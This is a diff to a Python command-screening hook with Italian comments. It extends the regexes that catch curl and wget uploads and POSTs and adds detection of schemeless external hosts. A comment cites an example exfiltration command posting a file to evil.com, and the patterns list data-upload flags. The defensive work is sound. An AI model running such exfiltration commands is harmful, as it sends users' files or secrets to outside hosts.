@@ -116,14 +116,28 @@ EXT_HINT = re.compile(
 # esterni come campi) non genera falsi positivi.
 DATA_FLAG_VAL = re.compile(
     r'(?<![\w-])(?:--data-(?:raw|binary|urlencode|ascii)|--data|-d|--form|-F'
-    r'|--upload-file|-T)\s*(?:\$?\'[^\']*\'|"[^"]*"|[^\s"\']+)',
+    r'|--upload-file|-T|--post-file|--post-data|--body-file|--body-data)[\s=]*(?:\$?\'[^\']*\'|"[^"]*"|[^\s"\']+)',
     re.IGNORECASE,
 )
+
+# Un host esterno scritto senza schema (`curl -d @f evil.com`) non passa da URL. Basta un host
+# interno nello stesso comando per far sembrare interno tutto l'invio: con un host interno visto,
+# ogni altra parola che ha la forma di un dominio conta come destinazione. Prima si tolgono i valori
+# dei flag che non sono destinazioni (file di output, intestazioni, credenziali, certificati).
+OTHER_FLAG_VAL = re.compile(
+    r'(?<![\w-])(?:-o|--output|-H|--header|-u|--user|-A|--user-agent|-e|--referer|-b|--cookie|-c'
+    r'|--cookie-jar|-w|--write-out|--cacert|--cert|--key|-K|--config|-O|--output-document'
+    r'|-a|--append-output|--save-cookies|--load-cookies)[\s=]*(?:\$?\'[^\']*\'|"[^"]*"|[^\s"\']+)',
+)
+BARE_HOST = re.compile(r'(?<![\w@/.:=-])([A-Za-z0-9][A-Za-z0-9-]*(?:\.[A-Za-z0-9-]+)*\.[A-Za-z]{2,})(?::\d+)?(?:/[^\s"\']*)?(?![\w.])')
+FILE_EXT = frozenset("txt json md csv log pdf png jpg jpeg gif html htm xml yaml yml toml ini cfg conf "
+                     "py js ts sh zip gz tgz tar bz2 xz db sqlite sql pem crt der p12 env bak out tmp".split())
 
 # --- Ramo A: marcatori POST/upload ---
 POST_MARKERS = re.compile(
     r'(curl|wget)\b[^\n]*(-X\s*(POST|PUT|PATCH|DELETE)|--request\s*(POST|PUT|PATCH|DELETE)'
-    r'|-d\b|--data|-F\b|--form|-T\b|--upload-file)'
+    r'|-d\b|--data|-F\b|--form|-T\b|--upload-file|--post-file|--post-data|--body-file|--body-data'
+    r'|--method[=\s]*(POST|PUT|PATCH|DELETE))'
     r'|requests\.(post|put|patch|delete)|urllib\.request|httpx\.(post|put|patch)'
     r'|import\s+smtplib|smtplib\.',
     re.IGNORECASE,
@@ -196,6 +210,14 @@ def main() -> int:
                 if not _internal_host(m.group(0)):
                     ext = True
                     break
+        if not ext and internal_seen:
+            senza_url = OTHER_FLAG_VAL.sub(" ", URL.sub(" ", dest))
+            for m in BARE_HOST.finditer(senza_url):
+                host = m.group(1)
+                if host.rsplit(".", 1)[-1].lower() in FILE_EXT or _internal_host(host):
+                    continue
+                ext = True
+                break
         if ext:
             return _ask()
         if internal_seen:
